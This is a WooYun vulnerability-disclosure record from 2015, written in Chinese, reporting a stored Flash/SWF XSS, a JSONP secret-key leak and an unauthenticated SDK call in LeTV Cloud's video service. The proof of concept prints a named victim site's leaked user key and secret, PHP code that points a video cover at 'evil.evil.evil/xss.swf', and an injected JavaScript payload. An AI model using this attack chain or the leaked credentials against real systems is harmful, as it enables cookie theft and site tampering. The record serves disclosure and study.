{"id": 79040, "wybug_id": "wooyun-2015-0159012", "wybug_title": "乐视云XSS指谁打谁", "wybug_corp": "乐视网", "wybug_author": "黑魔ひめ", "wybug_date": "2015-12-07 13:57", "wybug_open_date": "2016-01-23 15:16", "wybug_type": "XSS 跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "应用安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-23：\t细节向公众公开  简要描述： 这个XSS可以想打谁打谁。证明那里给出用乐视打游民的方法。这次审核不通过我就不提交了。 详细说明：  1.首先是XSS 在云点播后台可以修改视频封面 抓个包改为swf后缀的as3格式文件 云点播的flash由as3编写，封面下载后直接appendChild()显示，而未检查其类型，导致可以执行外部代码，或者是CVE-2015-5119之类的东西。 把恶意的视频贴到论坛里就可以收cookie了。 2.其次是敏感信息泄露http://api.letvcloud.com/gpc.php?cf=html5&sign=signxxxxx&ver=2.1&format=jsonp&pver=H5_Vod_20151203_4.0.9&bver=chrome49.0.2578.0&uuid=0AF6ED13C6122083C2D9E3DBA5780EBB_0&page_url=http%3A%2F%2Fyuntv.letv.com%2Fbcloud.html%3Fvu%3Dd5669d8923%26uu%3Dcfd9191aeb%26auto_play%3D0%26gpcflag%3D1%26width%3D640%26height%3D360&uu=cfd9191aeb&vu=d5669d8923&pf=html5&spf=0&callback=letvcloud144941740179958 乐视云点播用户后台预览视频的时候下载的jsonp这里泄露了用户的secret，uu利用用户的secret，uu可以进行流量统计，修改视频描述，标题，暂停视屏等操作。3.最后，未授权访问（？）http://help.letvcloud.com/Wiki.jsp?page=ResourceDownload这里可以下载到云点播的php版本sdk里面可以加上这样一段代码 \npublic function videoUpdatePic($video_id,$pic=''){ $api = 'video.update'; $params['video_id'] = $video_id; if(!empty($pic)){ $params['init_pic'] = $pic; $params['img'] = $pic; } return self::httpCall($api, $params); }\n 这个function可以实现不登录后台的情况下修改视频封面。    漏洞证明：  攻击http://www.gamersky.com/news/201509/665108.shtml这个页面首先抓个包看一下视频id：15879069其次通过2获得游民的uu和私钥\t\tpublic $user_unique='cfd9191aeb';\t\tpublic $secret_key='a8b27caefde043c5e51d53b65b2dce3f';最后利用\n<?phprequire(\"LetvCloudV1.php\"); $leApi = new LetvCloudV1();echo $leApi->videoUpdatePic(15879069,'http://evil.evil.evil/xss.swf');?>\nas3代码\nExternalInterface.call(\"function xss(){$(\\\"#leshitvauto\\\").before(\\\"<img src='http://www.sudops.com/wp-content/uploads/2014/07/wooyun-logo.png'></img>\\\");$(\\\"#leshitvauto\\\").remove();}\");\n配合1、3修改其封面达到在页面内插入wooyunLogo的效果。\n\n由于swf可以写任意js代码。所以窃取cookie，模拟点击，等等都轻而易举。   修复方案：  过滤   版权声明：转载请注明来源 黑魔ひめ@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-12-10 16:46 厂商回复： 感谢关注乐视安全，此问题已联系业务部门马上进行整改。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-02-16 23:54 |    \t\t黑魔ひめ \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:2        | 教我做游戏吧。。。)\t\t \n  _(:3」∠)_能说差不多等于没修复么    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}